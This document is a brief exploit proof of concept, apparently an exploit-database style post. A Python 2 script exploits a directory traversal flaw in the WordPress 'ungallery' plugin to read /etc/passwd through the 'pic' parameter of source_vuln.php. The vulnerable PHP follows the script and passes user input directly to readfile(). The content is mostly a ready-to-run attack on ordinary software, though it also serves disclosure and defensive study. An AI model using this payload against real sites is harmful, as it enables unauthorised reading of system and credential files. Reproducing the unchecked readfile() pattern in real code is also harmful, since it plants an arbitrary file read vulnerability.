#!/bin/python
 
import urllib2
 
FILEPATH = "/etc/passwd"
 
req = urllib2.urlopen("http://www.site.com/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../../../..%s" % FILEPATH)
 
print "Filepath: '%s'" % FILEPATH
print "Content: %s" % repr(req.read())
 
---------------
Vulnerable code
---------------
if ($_GET['pic']) {
    $filename = $_GET['pic'];
    $len = filesize($filename);
    $lastslash =  strrpos($filename, "/");
    $name =  substr($filename, $lastslash + 1);  
 
    header("Content-type: image/jpeg;\r\n");
    header("Content-Length: $len;\r\n");
    header("Content-Transfer-Encoding: binary;\r\n");
    header('Content-Disposition: inline; filename="'.$name.'"');    //  Render the photo inline.
    readfile($filename);
}